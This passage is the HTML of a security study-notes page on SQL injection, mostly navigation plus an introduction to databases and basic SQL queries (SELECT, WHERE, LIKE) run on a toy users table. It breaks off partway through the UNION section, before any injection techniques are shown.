+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../blue/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Blue
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../commandinjection/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Command Injection
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../commonlinuxprivesc/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Common Linux Privesc
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../crosssitescripting/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Cross-site Scripting
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../fileinclusion/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    File Inclusion
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../hydra/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Hydra
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../idor/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    IDOR
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../johntheripper/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    John the Ripper
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../kenobi/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Kenobi
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../linuxprivesc/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Linux PrivEsc
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../metasploitexploitation/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Metasploit - Exploitation
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../metasploitmeterpreter/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Metasploit - Meterpreter
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../motherssecret/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Mother's Secret
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../owaspjuiceshop/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    OWASP Juice Shop
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../owasptop10_2021/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    OWASP Top 10 - 2021
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../picklerick/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Pickle Rick
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    SQL Injection
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  <span class="md-ellipsis">
+    SQL Injection
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#resources" class="md-nav__link">
+    <span class="md-ellipsis">
+      Resources
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#introduction" class="md-nav__link">
+    <span class="md-ellipsis">
+      Introduction
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#database-fundamentals" class="md-nav__link">
+    <span class="md-ellipsis">
+      Database Fundamentals
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Database Fundamentals">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#tables" class="md-nav__link">
+    <span class="md-ellipsis">
+      Tables
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#structured-query-language-sql" class="md-nav__link">
+    <span class="md-ellipsis">
+      Structured Query Language (SQL)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Structured Query Language (SQL)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#select" class="md-nav__link">
+    <span class="md-ellipsis">
+      SELECT
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#union" class="md-nav__link">
+    <span class="md-ellipsis">
+      UNION
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#insert" class="md-nav__link">
+    <span class="md-ellipsis">
+      INSERT
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#update" class="md-nav__link">
+    <span class="md-ellipsis">
+      UPDATE
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#delete" class="md-nav__link">
+    <span class="md-ellipsis">
+      DELETE
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sql-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      SQL Injection
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="SQL Injection">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#in-band-sqli" class="md-nav__link">
+    <span class="md-ellipsis">
+      In-Band SQLi
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#blind-sqli" class="md-nav__link">
+    <span class="md-ellipsis">
+      Blind SQLi
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Blind SQLi">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#authentication-bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      Authentication Bypass
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#content-based-blind-sql-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      Content-based Blind SQL Injection
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#time-based-blind-sqli-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      Time-based Blind SQLi Injection
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#out-of-band-sqli" class="md-nav__link">
+    <span class="md-ellipsis">
+      Out-of-Band SQLi
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sqli-remediation" class="md-nav__link">
+    <span class="md-ellipsis">
+      SQLi Remediation
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../sqlinjectionlab/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SQL Injection Lab
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ssrf/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SSRF
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../steelmountain/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Steel Mountain
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../subdomainenumeration/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Subdomain Enumeration
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../traverse/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Traverse
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../uploadvulnerabilities/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Upload Vulnerabilities
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../vulnversity/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Vulnversity
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../whattheshell/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    What the Shell?
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#resources" class="md-nav__link">
+    <span class="md-ellipsis">
+      Resources
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#introduction" class="md-nav__link">
+    <span class="md-ellipsis">
+      Introduction
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#database-fundamentals" class="md-nav__link">
+    <span class="md-ellipsis">
+      Database Fundamentals
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Database Fundamentals">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#tables" class="md-nav__link">
+    <span class="md-ellipsis">
+      Tables
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#structured-query-language-sql" class="md-nav__link">
+    <span class="md-ellipsis">
+      Structured Query Language (SQL)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Structured Query Language (SQL)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#select" class="md-nav__link">
+    <span class="md-ellipsis">
+      SELECT
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#union" class="md-nav__link">
+    <span class="md-ellipsis">
+      UNION
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#insert" class="md-nav__link">
+    <span class="md-ellipsis">
+      INSERT
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#update" class="md-nav__link">
+    <span class="md-ellipsis">
+      UPDATE
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#delete" class="md-nav__link">
+    <span class="md-ellipsis">
+      DELETE
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sql-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      SQL Injection
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="SQL Injection">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#in-band-sqli" class="md-nav__link">
+    <span class="md-ellipsis">
+      In-Band SQLi
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#blind-sqli" class="md-nav__link">
+    <span class="md-ellipsis">
+      Blind SQLi
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Blind SQLi">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#authentication-bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      Authentication Bypass
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#content-based-blind-sql-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      Content-based Blind SQL Injection
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#time-based-blind-sqli-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      Time-based Blind SQLi Injection
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#out-of-band-sqli" class="md-nav__link">
+    <span class="md-ellipsis">
+      Out-of-Band SQLi
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sqli-remediation" class="md-nav__link">
+    <span class="md-ellipsis">
+      SQLi Remediation
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+  <h1>SQL Injection</h1>
+
+<h2 id="resources">Resources<a class="headerlink" href="#resources" title="Permanent link">&para;</a></h2>
+<p>Following a list of useful resources and cheat sheets related to SQL Injection.</p>
+<ul>
+<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">PortSwigger - SQL Injection Cheat Sheet</a></li>
+<li><a href="https://swisskyrepo.github.io/PayloadsAllTheThingsWeb/SQL%20Injection/">Payload All the Things - SQL Injection</a></li>
+<li><a href="https://websec.ca/kb/sql_injection">Websec - SQL Injection</a></li>
+<li><a href="https://book.hacktricks.xyz/pentesting-web/sql-injection">HackTricks - SQL Injection</a></li>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html">OWASP - SQL Injection Prevention</a></li>
+</ul>
+<h2 id="introduction">Introduction<a class="headerlink" href="#introduction" title="Permanent link">&para;</a></h2>
+<p>Structured Query Language Injection (SQLi) is an attack on a web application database server that causes malicious queries to be executed. Injection vulnerabilities arise when a web application communicates with a database without syntactic validation of a user's input.</p>
+<h2 id="database-fundamentals">Database Fundamentals<a class="headerlink" href="#database-fundamentals" title="Permanent link">&para;</a></h2>
+<p>Database is a way of digitally storing collections of data in an organized manner. A database is controlled by a Database Management System (DBMS). These systems fall into two either being <code>Relational</code> or <code>Non-Relational</code>. A DBMS can house multiple databases with each database containing its own set of related data.</p>
+<p><pre class="mermaid"><code>graph TD;
+    A[DBMS]--&gt;B[DB1];
+    A--&gt;C[DB2];
+    B--&gt;T1[Table 1];
+    B--&gt;T2[Table 2];
+    C--&gt;T3[Table 3];
+    C--&gt;T4[Table 4];</code></pre>
+<br></p>
+<p>A <code>relational database</code> is simply a collection of datasets with pre-defined relationships between them. These datasets are organized as a set of tables with columns and rows, making it easy to see and understand how different data structures relate to each other. Each table  typically contains a column with a unique ID (primary key) which is used by other tables as a reference thus creating relationships between tables. Popular examples of relational databases include <code>Microsoft SQL Server, MySQL, PostgreSQL and MariaDB</code>.</p>
+<p>A <code>non-relational database</code> does not use tables, columns and rows (ie. <code>tabular schema</code>). Typically a non-relational databases are employed to use a data storage model that is optimized for the specific requirements of the type of data being stored. This lack of structure limitation can have the benefit of providing flexibility over a relational database. Non-relational databases are sometimes referred to as <code>NoSQL</code> and popular examples include <code>MongoDB, Cassandra and ElasticSearch</code>.</p>
+<h3 id="tables">Tables<a class="headerlink" href="#tables" title="Permanent link">&para;</a></h3>
+<p>A table is made up of columns and rows (not dissimilar from a Microsoft Excel worksheet).</p>
+<p>In a table, each column is referred to as a <code>field</code> and has a unique name per table. Each column has a dataset type assigned to it which indicates what type of data it will store (ie. integer, strings or dates). As stated earlier, each table typically contains a column with some manner of a unique ID (<code>key</code> field) which permits relations to be formed between tables along with the ability to find specific row entries in SQL queries.</p>
+<p>Rows or <code>records</code> contain individual datasets. When new data is added to a database, a new row is created. Inversely, a row is deleted whenever a record is removed.</p>
+<h2 id="structured-query-language-sql">Structured Query Language (SQL)<a class="headerlink" href="#structured-query-language-sql" title="Permanent link">&para;</a></h2>
+<p>SQL is used for querying databases. Queries to databases are referred to as <code>statements</code>. The most common commands/statements when interfacing with databases include retrieving, updating, inserting and deleting datasets.</p>
+<p>It should be noted different database servers have their own syntax and slight variations on how things work. For the rest of these notes, syntax for MySQL databases will be used. Furthermore, it should be noted that SQL syntax is not case sensitive.</p>
+<h4 id="select">SELECT<a class="headerlink" href="#select" title="Permanent link">&para;</a></h4>
+<p>Data is retrieved from a database using the <code>SELECT</code> statement. Take for example the statement below.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="p">;</span>
+</code></pre></div>
+SELECT tells the database that we want to retrieve some data from the database. The <code>*</code> lets the database know that we wish to retrieve all columns from the table. The <code>from users</code> portion of the statement tells the database which table to retrieve the data from (in this example the data is retrieved from the users table). The <code>;</code> at the end of the statement indicates to the database that this is the end of our query.</p>
+<p>Similarly, we can structure the statement to retrieve specific columns from the desired table. In this case, the <code>*</code> from earlier example statement is replaced with the field names of the desired columns (multiple columns can be retrieved by comma separating the fields).</p>
+<p>Take for example the table named <em>users</em> below.</p>
+<table>
+<thead>
+<tr>
+<th style="text-align: center;">id</th>
+<th style="text-align: center;">username</th>
+<th style="text-align: center;">password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: center;">1</td>
+<td style="text-align: center;">admin</td>
+<td style="text-align: center;">password123</td>
+</tr>
+<tr>
+<td style="text-align: center;">2</td>
+<td style="text-align: center;">joe</td>
+<td style="text-align: center;">p4ssw0rd</td>
+</tr>
+<tr>
+<td style="text-align: center;">3</td>
+<td style="text-align: center;">jane</td>
+<td style="text-align: center;">qwerty</td>
+</tr>
+</tbody>
+</table>
+<p><br></p>
+<p>The following statement would return only columns username and password.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">username</span><span class="p">,</span><span class="n">password</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="p">;</span>
+</code></pre></div>
+<br></p>
+<table>
+<thead>
+<tr>
+<th style="text-align: center;">username</th>
+<th style="text-align: center;">password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: center;">admin</td>
+<td style="text-align: center;">password123</td>
+</tr>
+<tr>
+<td style="text-align: center;">joe</td>
+<td style="text-align: center;">p4ssw0rd</td>
+</tr>
+<tr>
+<td style="text-align: center;">jane</td>
+<td style="text-align: center;">qwerty</td>
+</tr>
+</tbody>
+</table>
+<p><br></p>
+<p>While querying the database, we may need to limit the number of records retrieved by our query. This can be accomplished using <code>LIMIT x</code> to force the database to return only the specified number (<code>x</code>) of records. For example LIMIT 1 tells the database to return only one row of data.</p>
+<p>Similarly, we can tell the database to skip a record by using <code>LIMIT x,y</code> where <code>x</code> denotes the number of records to skip and <code>y</code> denotes the number of records to retrieve.</p>
+<p>Take for example the following statement used with the <em>users</em> table presented above.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">LIMIT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">;</span>
+</code></pre></div>
+<br></p>
+<table>
+<thead>
+<tr>
+<th style="text-align: center;">username</th>
+<th style="text-align: center;">password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: center;">joe</td>
+<td style="text-align: center;">p4ssw0rd</td>
+</tr>
+<tr>
+<td style="text-align: center;">jane</td>
+<td style="text-align: center;">qwerty</td>
+</tr>
+</tbody>
+</table>
+<p><br></p>
+<p>In the event where a specific record needs to be retrieved, the <code>WHERE</code> clause can be used. The following statement used with the <em>users</em> table presented above would return the specific record as requested by the statement.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;joe&#39;</span><span class="p">;</span>
+</code></pre></div>
+<br></p>
+<table>
+<thead>
+<tr>
+<th style="text-align: center;">username</th>
+<th style="text-align: center;">password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: center;">joe</td>
+<td style="text-align: center;">p4ssw0rd</td>
+</tr>
+</tbody>
+</table>
+<p><br></p>
+<p>Alternatively, we can tell the database to retrieve all records except for the specified record using the following statement.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="s1">&#39;joe&#39;</span><span class="p">;</span>
+</code></pre></div>
+<br></p>
+<table>
+<thead>
+<tr>
+<th style="text-align: center;">username</th>
+<th style="text-align: center;">password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: center;">admin</td>
+<td style="text-align: center;">password123</td>
+</tr>
+<tr>
+<td style="text-align: center;">jane</td>
+<td style="text-align: center;">qwerty</td>
+</tr>
+</tbody>
+</table>
+<p><br></p>
+<p>Similarly, conditional clauses like <code>OR</code> and <code>AND</code> can used to craft more complex statements based on dataset retrieval requirements.</p>
+<p>Take for example the following statement where only records associated with admin or joe will be retrieved.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;admin&#39;</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;joe&#39;</span><span class="p">;</span>
+</code></pre></div>
+<br></p>
+<table>
+<thead>
+<tr>
+<th style="text-align: center;">username</th>
+<th style="text-align: center;">password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: center;">admin</td>
+<td style="text-align: center;">password123</td>
+</tr>
+<tr>
+<td style="text-align: center;">joe</td>
+<td style="text-align: center;">p4ssw0rd</td>
+</tr>
+</tbody>
+</table>
+<p><br></p>
+<p>Or the following statement where the record will only be retrieved when username is equal to admin and the password is equal to password123.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;admin&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;password123&#39;</span><span class="p">;</span>
+</code></pre></div>
+<br></p>
+<table>
+<thead>
+<tr>
+<th style="text-align: center;">username</th>
+<th style="text-align: center;">password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: center;">admin</td>
+<td style="text-align: center;">password123</td>
+</tr>
+</tbody>
+</table>
+<p><br></p>
+<p>The <code>LIKE</code> clause can be used to specify data which isn't an exact match but instead either starts, contains or ends with certain characters by choosing where to place the wildcard character <code>%</code>.</p>
+<p>The following statement returns any row with the username beginning with the letter a.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;a%&#39;</span><span class="p">;</span>
+</code></pre></div>
+<br></p>
+<table>
+<thead>
+<tr>
+<th style="text-align: center;">username</th>
+<th style="text-align: center;">password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: center;">admin</td>
+<td style="text-align: center;">password123</td>
+</tr>
+</tbody>
+</table>
+<p><br></p>
+<p>The following statement will return any record with the username ending with the letter e.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%e&#39;</span><span class="p">;</span>
+</code></pre></div>
+<br></p>
+<table>
+<thead>
+<tr>
+<th style="text-align: center;">username</th>
+<th style="text-align: center;">password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: center;">joe</td>
+<td style="text-align: center;">p4ssw0rd</td>
+</tr>
+<tr>
+<td style="text-align: center;">jane</td>
+<td style="text-align: center;">qwerty</td>
+</tr>
+</tbody>
+</table>
+<p><br></p>
+<p>The following statement will return any record where the username contains the letters a and n in the specified order.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%an%&#39;</span><span class="p">;</span>
+</code></pre></div>
+<br></p>
+<table>
+<thead>
+<tr>
+<th style="text-align: center;">username</th>
+<th style="text-align: center;">password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: center;">jane</td>
+<td style="text-align: center;">qwerty</td>
+</tr>
+</tbody>
+</table>
+<p><br></p>
+<h4 id="union">UNION<a class="headerlink" href="#union" title="Permanent link">&para;</a></h4>
+<p>The <code>UNION</code> statement is used to combine the results of two or more <code>SELECT</code> statements. The UNION statement <strong>must</strong> retrieve the same number of columns in each SELECT statement. The retrieved columns <strong>must</strong> have similar data type and column order.</p>
+<p>Consider the following tables named <em>customers</em> and <em>vendors</em>.</p>
+<table>
+<thead>
+<tr>
+<th style="text-align: center;">id</th>
+<th style="text-align: center;">name</th>
+<th style="text-align: center;">address</th>
+<th style="text-align: center;">city</th>
+<th style="text-align: center;">postal</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: center;">1</td>
+<td style="text-align: center;">Jo Shepard</td>
+<td style="text-align: center;">123 53 Street</td>
+<td style="text-align: center;">Edmonton</td>
+<td style="text-align: center;">T1J 4M3</td>
+</tr>
+<tr>
+<td style="text-align: center;">2</td>
+<td style="text-align: center;">Jane Smith</td>
+<td style="text-align: center;">59 Pulsar Street</td>
+<td style="text-align: center;">Calgary</td>
+<td style="text-align: center;">R2Y 4J1</td>
+</tr>
+<tr>
+<td style="text-align: center;">3</td>
+<td style="text-align: center;">Paul Rogers</td>
+<td style="text-align: center;">45 Red Street</td>
+<td style="text-align: center;">Edmonton</td>
